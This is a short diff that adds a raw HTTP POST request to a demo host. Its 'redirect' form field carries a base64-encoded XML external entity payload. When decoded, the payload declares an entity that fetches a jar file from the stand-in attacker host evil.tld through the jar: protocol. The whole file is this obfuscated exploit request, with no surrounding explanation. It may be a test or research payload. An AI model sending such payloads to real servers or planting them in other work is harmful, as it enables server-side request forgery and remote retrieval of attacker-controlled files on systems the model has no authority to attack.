@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 109
+Connection: close
+
+redirect=PCFET0NUWVBFIHIgWzwhRU5USVRZIHggU1lTVEVNICJqYXI6aHR0cDovL2V2aWwudGxkL3guamFyIS94Ij5dPjxyPiZ4Ozwvcj4=
